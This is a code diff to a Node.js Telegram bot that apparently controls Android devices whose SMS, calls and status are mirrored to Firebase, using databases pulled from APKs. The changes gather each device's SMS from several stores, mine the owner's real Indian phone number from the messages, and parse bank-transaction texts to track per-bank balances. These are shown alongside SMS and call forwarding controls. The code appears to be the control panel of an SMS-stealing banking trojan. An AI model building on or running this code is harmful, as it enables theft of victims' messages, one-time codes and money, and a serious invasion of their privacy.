@@ -13,7 +13,7 @@ const express = require('express');
 const axios = require('axios');
 const {
   BANK_CONFIG, BANK_NAMES, detectBanksFromText,
-  parseBalanceFromText, isBankTransaction,
+  parseBalanceFromText, isBankTransaction, parseMsgTime,
   extractRealNumber, extractIndianNumber, parseTokenFromMessage,
   maskFirebase, maskDeviceId, fmtAmount, fmtTimeAgo, safeMd, sleep, resolveWebhookBase
 } = require('./lib');
@@ -322,6 +322,27 @@ async function extractFirebaseFromAPK(apkBuffer) {
 // ============================================================
 function dataPathOf(user) { return user.data_path || 'clients'; }
 
+// SMS mirror stores vary across the app family. The consolidated INBOUND store
+// is at ROOT-level `messages/<deviceId>`; some apps also keep outgoing
+// "SMS sent to…" logs and sms/smsnormal variants. Merge everything (keys
+// namespaced by store) so number mining sees as much evidence as possible.
+async function collectSmsStores(fbUrl, dp, deviceId) {
+  const paths = [
+    `${dp}/${deviceId}/messages`,   // client-scoped logs
+    `messages/${deviceId}`,         // root consolidated SMS mirror
+    `${dp}/${deviceId}/sms`,
+    `${dp}/${deviceId}/smsnormal`
+  ];
+  const merged = {};
+  for (const p of paths) {
+    const obj = await fbGet(fbUrl, p).catch(() => null);
+    if (obj && typeof obj === 'object') {
+      for (const [k, v] of Object.entries(obj)) merged[`${p}|${k}`] = v;
+    }
+  }
+  return Object.keys(merged).length ? merged : null;
+}
+
 async function refreshGlobalDevice(uid, fbUrl, deviceId, dev, storePhone = true) {
   if (!fbUrl || !deviceId) return null;
   const g = state.global_devices[deviceId] || { id: deviceId, fbUrl, owner_uid: String(uid), addedAt: new Date().toISOString(), banks: [], balanceByBank: {}, totalBalance: 0, phone: 'N/A', name: '', battery: '?', online: false, lastSeen: null, sims: [] };
@@ -374,20 +395,46 @@ async function refreshGlobalDevice(uid, fbUrl, deviceId, dev, storePhone = true)
   g.name = String(st.device_model || st.deviceModel || dev?.deviceModel || dev?.device || dev?.modelName || g.name || deviceId).substring(0, 28);
   g.sims = Array.isArray(st.sims) ? st.sims.map(s => String(s).toLowerCase().replace(/[^a-z0-9]/g, '')).filter(Boolean) : [];
 
-  let phone = st.simNumber || st.sim1Number || st.mobNo || dev?.mobNo || dev?.phoneNumber || st.phone || g.phone || 'N/A';
-  if ((!phone || phone === 'N/A') && storePhone) {
+  // Real numbers, kept separate so the device page can show BOTH:
+  //  • sim_phone — number reported by the device status (SIM field)
+  //  • sms_phone — real number mined from the device's own SMS history
+  //                (recharge/expiry/"your mobile number", "To:" fields).
+  // `phone` stays the single "primary" (SIM first, then SMS) for compact UIs.
+  const normNum = s => {
+    let n = String(s || '').replace(/[^\d]/g, '');
+    if (n.startsWith('91') && n.length === 12) n = n.slice(2);
+    else if (n.startsWith('0') && n.length === 11) n = n.slice(1);
+    return /^[6-9]\d{9}$/.test(n) ? '+91' + n : null;
+  };
+
+  const simPhone = normNum(st.simNumber || st.sim1Number || st.sim2Number || '') || g.sim_phone || '';
+  let smsPhone = g.sms_phone || '';
+  if (storePhone) {
     const ud = state.users[String(uid)] || getUserData(uid);
-    const msgs = await fbGet(fbUrl, `${dataPathOf(ud)}/${deviceId}/messages`);
-    const num = extractRealNumber(msgs);
-    if (num) phone = num;
+    const msgs = await collectSmsStores(fbUrl, dataPathOf(ud), deviceId);
+    // Strict: only accept numbers with real "owner" cues (operator recharge /
+    // "your number" / Jio Number / structured recipient), so vendor service
+    // numbers ("SMS sent to PhonePe…") can never be shown as the device's own.
+    const num = extractRealNumber(msgs, { minWeight: 3 });
+    if (num) smsPhone = '+91' + num;
   }
+  let phone = simPhone || smsPhone || 'N/A';
+  let phoneSource = simPhone ? 'sim' : (smsPhone ? 'sms' : '');
+  if (!phone || phone === 'N/A') {
+    // Arbitrary app fields last — they can be fake/device defaults.
+    const f = normNum(st.mobNo || dev?.mobNo || dev?.phoneNumber || st.phone || '');
+    if (f) { phone = f; phoneSource = g.phoneSource || 'device'; }
+  }
+  g.sim_phone = simPhone;
+  g.sms_phone = smsPhone;
   g.phone = String(phone || 'N/A');
+  g.phoneSource = phoneSource;
 
   // bank balances from messages (always real)
   if (storePhone) {
     try {
       const ud = state.users[String(uid)] || getUserData(uid);
-      const msgs = await fbGet(fbUrl, `${dataPathOf(ud)}/${deviceId}/messages`);
+      const msgs = await collectSmsStores(fbUrl, dataPathOf(ud), deviceId);
       if (msgs && typeof msgs === 'object') {
         const bankSet = new Set(g.banks || []);
         const balMap = { ...(g.balanceByBank || {}) };
@@ -395,14 +442,16 @@ async function refreshGlobalDevice(uid, fbUrl, deviceId, dev, storePhone = true)
           if (!msg || typeof msg !== 'object') continue;
           const text = String(msg.message || msg.text || msg.body || '');
           if (!text) continue;
+          if (!isBankTransaction(text, msg.sender)) continue;
           const banks = detectBanksFromText(text);
           const amt = parseBalanceFromText(text);
           for (const b of banks) {
             bankSet.add(b);
             if (amt !== null) {
               const stamped = balMap[b] || {};
-              const ts = msg.timestamp || msg.dateTime || Date.now();
-              if (!stamped.timestamp || new Date(stamped.timestamp).getTime() < new Date(ts).getTime()) {
+              const ts = parseMsgTime(msg.timestamp) || parseMsgTime(msg.id) || parseMsgTime(msg.dateTime) || Date.now();
+              const prev = stamped.timestamp ? new Date(stamped.timestamp).getTime() : 0;
+              if (!prev || ts >= prev) {
                 balMap[b] = { balance: amt, timestamp: new Date(ts).toISOString() };
               }
             }
@@ -609,6 +658,28 @@ function deviceStatusLine(g) {
   return `❌ Offline (${fmtTimeAgo(g.lastSeen)} ago)`;
 }
 
+// Compact phone for list buttons — primary (SIM first, else SMS real number).
+function phoneLabel(g) {
+  const p = (g && (g.sim_phone || g.sms_phone || (g.phone && g.phone !== 'N/A' ? g.phone : ''))) || '';
+  if (!p) return 'N/A';
+  const tag = g.sim_phone ? '' : ' (SMS📨)';
+  return p + tag;
+}
+
+// Full phone for the device page — shows BOTH real numbers when available:
+// the SIM-reported one and the one mined from the device's own SMS history.
+function phoneDetail(g) {
+  if (!g) return 'N/A';
+  const norm = n => String(n || '').replace(/[^\d]/g, '');
+  const parts = [];
+  if (g.sim_phone) parts.push(`SIM ${g.sim_phone}`);
+  if (g.sms_phone && norm(g.sms_phone) !== norm(g.sim_phone)) parts.push(`SMS ${g.sms_phone}`);
+  if (parts.length === 0 && g.phone && g.phone !== 'N/A') {
+    parts.push(g.phone + (g.phoneSource === 'device' ? ' (app)' : ''));
+  }
+  return parts.length ? parts.join(', ') : 'N/A';
+}
+
 // ============================================================
 // SCREENS
 // ============================================================
@@ -710,7 +781,7 @@ async function showOnlineDevices(uid, chatId, messageId = null, page = 0, edit =
     else if (b >= 50) bEmoji = '🟡';
     else if (b >= 20) bEmoji = '🟠';
     else bEmoji = '🔴';
-    const phone = dev.phone && dev.phone !== 'N/A' ? ` 📞${dev.phone}` : '';
+    const phone = dev.phone && dev.phone !== 'N/A' ? ` 📞${phoneLabel(dev)}` : '';
     buttons.push([{ text: `🟢 ${dev.name} ${bEmoji}${dev.battery}%${phone}`, callback_data: `dev_${dev.id}` }]);
   }
   const nav = [];
@@ -775,7 +846,7 @@ async function showDeviceManagement(uid, chatId, messageId, deviceId, edit = tru
     `┃ 💰 ${fmtAmount(balData.total)}`,
     `┃ ${bEmoji} Battery: ${info.battery}%`,
     bankDisp,
-    `┃ 📞 Mobile: ${info.phone}`,
+    `┃ 📞 Mobile: ${phoneDetail(info)}`,
     `┃ 📡 SIM: ${sim}`,
     `┃ 📤 ${fwdStateLine(user, deviceId, 'call')}`,
     `┃ 📨 ${fwdStateLine(user, deviceId, 'sms')}`,
@@ -897,11 +968,13 @@ async function gatherBankCandidates(uid, deviceId) {
   // scan messages afresh for detected banks
   const info = await getDeviceInfo(uid, deviceId);
   if (info && info.fbUrl) {
-    const msgs = await fbGet(info.fbUrl, `${dataPathOf(user)}/${deviceId}/messages`);
+    const msgs = await collectSmsStores(info.fbUrl, dataPathOf(user), deviceId);
     if (msgs && typeof msgs === 'object') {
       for (const msg of Object.values(msgs)) {
         if (!msg || typeof msg !== 'object') continue;
-        detectBanksFromText(msg.message || msg.text || '').forEach(b => set.add(b));
+        const text = String(msg.message || msg.text || msg.body || '');
+        if (!isBankTransaction(text, msg.sender)) continue;
+        detectBanksFromText(text).forEach(b => set.add(b));
       }
     }
   }
@@ -912,7 +985,7 @@ async function gatherBankCandidates(uid, deviceId) {
 // Try real balance from existing device SMS first (fast, no trigger)
 async function tryScanBalance(uid, deviceId, bank, info) {
   const user = getUserData(uid);
-  const msgs = await fbGet(info.fbUrl, `${dataPathOf(user)}/${deviceId}/messages`);
+  const msgs = await collectSmsStores(info.fbUrl, dataPathOf(user), deviceId);
   if (!msgs || typeof msgs !== 'object') return null;
   const bankKw = BANK_CONFIG[bank]?.keywords?.[0];
   let best = null; let bestTs = 0;
@@ -923,7 +996,7 @@ async function tryScanBalance(uid, deviceId, bank, info) {
     if (bankKw && !text.toUpperCase().includes(bankKw)) continue;
     const amt = parseBalanceFromText(text);
     if (amt === null) continue;
-    const ts = new Date(msg.timestamp || msg.dateTime || 0).getTime() || 0;
+    const ts = parseMsgTime(msg.timestamp) || parseMsgTime(msg.id) || parseMsgTime(msg.dateTime);
     if (ts >= bestTs) { best = amt; bestTs = ts; }
   }
   return best;
@@ -1124,7 +1197,7 @@ async function showAdminDevices(uid, chatId, messageId = null, page = 0, edit = 
   const buttons = [];
   for (const dev of chunk) {
     const st = dev.online ? '🟢' : `🔴`;
-    const phone = dev.phone && dev.phone !== 'N/A' ? ` 📞${dev.phone}` : '';
+    const phone = dev.phone && dev.phone !== 'N/A' ? ` 📞${phoneLabel(dev)}` : '';
     buttons.push([{ text: `${st} ${dev.name} — ${dev.online ? 'Online' : fmtTimeAgo(dev.lastSeen)}${phone}`, callback_data: `adev_${dev.id}` }]);
   }
   const nav = [];
